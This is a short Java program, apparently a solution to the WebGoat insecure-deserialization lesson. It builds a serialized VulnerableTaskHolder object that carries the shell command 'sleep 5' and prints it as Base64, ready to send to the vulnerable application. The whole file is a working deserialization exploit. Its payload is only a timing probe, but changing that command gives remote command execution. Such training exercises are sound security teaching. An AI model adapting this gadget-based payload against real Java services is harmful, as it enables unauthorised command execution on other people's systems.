import java.io.*;
import java.util.*;
//the import is necessary to run the class inside webgoat class path
import org.dummy.insecure.framework.*;

public class Pwn {

    public static void main(String[] args) throws Exception {
        VulnerableTaskHolder go = new VulnerableTaskHolder("IOD", "sleep 5");

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(go);
        oos.flush();
        byte[] exploit = bos.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(exploit));
    }
}
